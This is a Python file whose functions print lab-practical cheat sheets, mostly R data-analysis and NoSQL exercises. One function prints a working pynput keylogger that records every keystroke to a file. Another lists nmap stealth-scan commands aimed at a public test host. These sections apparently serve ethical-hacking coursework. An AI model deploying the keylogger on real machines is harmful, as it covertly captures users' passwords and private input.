def pr1():
    print("""  
    
Practical 1 Practical of NoSQL

install.packages("R4CouchDB")
#devtools::install_github("ropensci/sofa")
Install.packages(“sofa”)
library('sofa')
#create connection object
x<-Cushion$new()
#to check whether object created
x$ping()
#username password for create database
user <- Sys.getenv("admin")
pwd <- Sys.getenv("123")
(x <- Cushion$new(user="admin", pwd="123"))
#create database ty
db_create(x, "ty")
x$ping()
db_list(x)
#create json doc
doc1<-'{"rollno":"01","name":"ABC","GRADE":"A"}'
doc_create(x,doc1,dbname = "ty",docid = "a_1") 
doc2<-'{"rollno":"02","name":"PQR","GRADE":"A"}'
doc_create(x,doc2,dbname = "ty",docid = "a_2")
doc3<-'{"rollno":"03","name":"xyz","GRADE":"B","REMARK":"PASS"}'
doc_create(x,doc3,dbname = "ty",docid = "a_3")
#Changes Feed
db_changes(x,"ty")
#search for id > null so all docs will display
db_query(x,dbname = "ty",selector = list('_id'=list('$gt'=NULL)))$docs
#search for students with grade is A
db_query(x,dbname = "ty",selector = list(GRADE="A"))$docs
#search for students with remark =pass
db_query(x,dbname = "ty",selector = list(REMARK="PASS"))$docs
#return only certain fields where rollno>2
db_query(x,dbname = "ty",selector = list(rollno=list('$gt'='02')),fields=c("name","GRADE"))$docs
#convert the result of a query into a data frame using jsonlite
library("jsonlite")
res<-db_query(x,dbname = "ty",selector = list('_id'=list('$gt'=NULL)),fields=c("name","rollno","GRADE","REMARK"),as="json")
#display json doc fromJSON(res)$docs
doc_delete(x,dbname ="ty",docid = "a_2") 
doc_get(x,dbname ="ty",docid = "a_2")
doc2<-'{"name":"Sdrink","beer":"TEST","note":"yummy","note2":"yay"}'

    
    """)

def pr2():
    print(""" 

Practical 2 RUN Practical of MongoDB



use vish
db.createCollection("vish")
db.vish.insert({name:"Vish",age:20})
db.vish.insert({name:"Vish",age:20})
show collections
db.vish.find()
db.vish.updateOne({name:"Vish"},{ $set: { name : "Raju"})
db.vish.find().limit(1)
db.vish.find().sort({age:1})
    
    
    """)

def pr3():
    print(""" 
Practical 3 RUN Practical of Principal Component Analysis

data_iris <- iris[1:4]
Cov_data <- cov(data_iris)
Eigen_data <- eigen(Cov_data)
######princomp performs a principal components analysis on the given numeric data matrix and returns the results as an object of class princomp.
######cor === a logical value indicating whether the calculation should use the correlation matrix or the covariance matrix. (The correlation matrix can only be used if there are no constant variables.)
PCA_data <- princomp(data_iris,cor="False")
Eigen_data$values
PCA_data$sdev^2
PCA_data$loadings[,1:4]
Eigen_data$vectors
summary(PCA_data)
biplot(PCA_data)
screeplot(PCA_data,type="lines")
model2=PCA_data$loadings[,1]
model2_scores <- as.matrix(data_iris)%*%model2
library(class)
install.packages("e1071")
library(e1071)
mod1 <- naiveBayes(iris[,1:4],iris[,5])
mod2 <- naiveBayes(model2_scores,iris[,5])
table(predict(mod1,iris[,1:4]),iris[,5])
table(predict(mod2,model2_scores),iris[,5])    



chatgpt
# Load the iris dataset
data(iris)

# Select the numeric columns of the dataset
numeric_cols <- c("Sepal.Length", "Sepal.Width", "Petal.Length", "Petal.Width")
iris_numeric <- iris[numeric_cols]
#iris_numeric <- iris[1:4]

# Perform PCA on the dataset
pca <- prcomp(iris_numeric, center = TRUE, scale. = TRUE)

# Print the summary of the PCA results
summary(pca)
biplot(pca)
screeplot(pca,type="lines")

# Plot the first two principal components
#plot(pca$x[,1], pca$x[,2], col = iris$Species)


    
    
    """)

def pr4():
    print(""" 
Practical 4 RUN Practical of Clustering


data("iris")
summary(iris)
head(iris)
x = iris[,1:4]
head(x)
model = kmeans(x,3)
library(cluster)
model$cluster
model$centers
clusplot(x,model$cluster)
clusplot(x,model$cluster,color=T,shade=T)
#Agglomerative clusters
clusters <- hclust(dist(iris[,3:4]))
plot(clusters)
clusterCut <- cutree(clusters,3)
table(clusterCut,iris$Species)

    
    
    
    """)

def pr5():
    print(""" 
    
Practical 5 RUN Practical of Time-series forecasting

data("AirPassengers")
class(AirPassengers)
start(AirPassengers)
end(AirPassengers)
frequency(AirPassengers)
summary(AirPassengers)
plot(AirPassengers)
abline(reg = lm(AirPassengers ~ (AirPassengers)))
cycle(AirPassengers)
plot(aggregate(AirPassengers,FUN=mean))
boxplot(AirPassengers~cycle(AirPassengers))
    
    
    """)

def pr6():
    print(""" 
Practical 6 RUN Practical of Single/Multiple Regresion


#Consider SOme data
height <- c(102,117,115,116,113,118)
weight <- c(61,78,22,34,98,90)
#lm is for linear regression
student <- lm(weight ~ height)
student
#to predict use predict command
predict(student,data.frame(height=199),interval="confidence")
#to plot the data
plot(student)

    
    """)

def pr7():
    print("""     
    

Practical 7 Principal of Logistics Regression

height<-c(102,117,105,141,135,115,138,144,137,100,131,119,115,121,113)
weight<-c(61,46,62,54,60,69,51,50,46,69,48,56,64,48,59)
student<-lm(weight~height)
student
predict(student,data.frame(height=199),interval="confidence")
plot(student)
student

    
    """)

def pr8():
    print(""" 
    
#practical 8 hypothesis
dataset1<-c(12,123,13,434,2342,1231,3424,2343)
dataset2 <-c(323,234,455,54534)
dataset1
dataset2
mean(dataset1)
mean(dataset2)
sd(dataset1)
sd(dataset2)
a<-t.test(dataset1,dataset2,alternate="two.sided",mu=10,conf.int=0.95)
a
a$p.value
a$statistic

    """)

def pr9():
    print("""   
    
Practical No 9 RUN  Analysis variance

# import inbuilt dataset
data("warpbreaks")
head(warpbreaks)
summary("warpbreaks")
model_1 <- aov(breaks~wool+tension,data=warpbreaks)
summary(model_1)
plot(model_1)
model_2 <- aov(breaks~wool+tension+wool:tension,data=warpbreaks)
model
    
    """)

def csv():
    print(""" 
    create csv file 

    
# Create a data frame
#create a CSV file  student.csv file with fields (name ,roll no, gender, tmarks)
student <- data.frame(
  roll_no = 1:5,
  name = c("John", "Jane", "Bob", "Alice", "Tom"),
  age = c(25, 32, 19, 41, 28),
  gender = c("male","male","female","female","male"),
  tmarks = c(67,25,74,77,57)
)

# Write the data frame to a CSV file
write.csv(student, "student.csv", row.names = FALSE)

# import and store the dataset in data1
data <- read.csv("student.csv")
print(data)


   
    
    """)

def pr10():
    print("""  
Practical 10 RUN Practical of Decision Tree


mydata <- data.frame(iris)
attach(mydata)
install.packages("rpart")
library(rpart)
model <- rpart(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,method="class")
plot(model)

text(model,use.n=TRUE,all=TRUE,cex=0.8)
install.packages("tree")
library(tree)
model1 <- tree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,method="class",split="gini")
plot(model1)

text(model,all=TRUE,cex=0.6)
install.packages("party")
library(party)
model2 <- ctree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata)
plot(model2)

library(tree)
mydata <- data.frame(iris)
attach(mydata)
model <- tree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,method="class",control=tree.control(nobs = 150,mincut = 10))
plot(model1)

text(model,all=TRUE,cex=0.6)
predict(model,iris)
model2 <- ctree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,controls=ctree_control(maxdepth=2))
plot(model2)    
    """)

def eh1():
    print(""" 
    #keylogger 

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/Admin/Desktop/dd"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
  
    
    """)

def eh2():
    print(""" 
    
1) command :- nmap -sA -T4 scanme.nmap.org
2)Command: nmap -p22,113,139 scanme.nmap.org
3)Command: nmap -sF -T4 para
4)Command: nmap –sN –p 22 scanme.nmap.org
5)Command: nmap -sX -T4 scanme.nmap.org

    
    
    """)
